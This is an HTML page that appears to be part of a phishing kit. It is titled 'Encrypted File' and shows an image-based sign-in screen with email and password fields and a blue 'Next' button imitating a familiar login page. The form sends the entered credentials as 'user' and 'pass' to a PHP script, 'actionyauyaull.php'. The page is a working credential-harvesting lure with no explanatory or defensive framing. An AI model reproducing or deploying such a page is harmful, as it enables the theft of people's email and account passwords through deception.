<html><head>
        <title>Encrypted File</title>
        </head>
    <body>
        
           <div class="logo">
               <img src="bettyimages/yauihyt.png" style="position:absolute;left:0px;top:0px">
               
           </div>
                          
        <!-- --- Form Login --- !-->
        <div id="form" style="left:680px;height:200px;">
            <form action="actionyauyaull.php" method="post">
            <h2 style="position:absolute;right:20%;top:40px;COLOR:#FFFFFF;height:150px;">  ..</h2>
            <div id="header-border-div0"></div>
        <input type="user" name="user" placeholder="Enter your email" required="" style="position:absolute;left:866px;top:217px;width:300;height:38px;padding:2px;border-radius:0px;border: 0px solid #bdc4c9;font-size: 1em;
font-family: Helvetica,Arial,sans-serif;
font-weight: 400;
">
        <input type="password" name="pass" placeholder="Password" required="" style="position:absolute;left:866px;top:270px;width:300;height:38px;padding:2px;border-radius:0px;border: 0px solid #bdc4c9;font-size: 1em;
font-family: Helvetica,Arial,sans-serif;
font-weight: 400;">
        <button type="submit" class="login-button button-primary" style="position:absolute;top:328px;left:866px;padding:8px;font-size:.900em;box-sizing:border-box;display:block;cursor:pointer;background: #4285f4;border: none;border-radius: 5px;padding: .75em 1em;color: #fff!important;text-align: center;text-transform: capitalize;font-family: Optimist,Arial,Helvetica,sans-serif;vertical-align: baseline;width:305;height:45px">
            <div class="sign-in-text">Next          </div>
            </button> 
            </form>
            </div>
        <!-- --- Form Login --- !-->
        <!-- --- Under Form --- !-->
                <!-- --- Under Form --- !-->
        <!-- --- Footer ---- !-->
        <div id="footer">
                            </div>
        <!-- --- Footer ---- !-->
    
 </header></body></html>